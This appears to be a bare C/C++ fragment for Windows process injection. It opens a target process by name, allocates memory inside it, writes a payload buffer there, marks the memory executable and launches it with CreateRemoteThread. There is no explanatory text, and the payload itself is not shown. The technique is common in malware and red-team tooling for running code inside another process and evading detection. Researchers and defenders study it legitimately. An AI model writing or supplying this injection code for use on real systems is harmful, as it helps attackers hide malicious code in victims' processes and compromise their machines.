DWORD iProcessId = NULL;
HANDLE hProcess = NULL;
GetProcessHandle(sProcessName, &iProcessId, &hProcess);
LPVOID pProcess = VirtualAllocEx(hProcess, NULL, sPayloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
WriteProcessMemory(hProcess, pProcess, pPayload, sPayloadSize, NULL);
DWORD proc = 0;
VirtualProtectEx(hProcess, pProcess, sPayloadSize, PAGE_EXECUTE_READ, &proc);
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pProcess, NULL, 0, NULL);
WaitForSingleObject(hThread, 2000);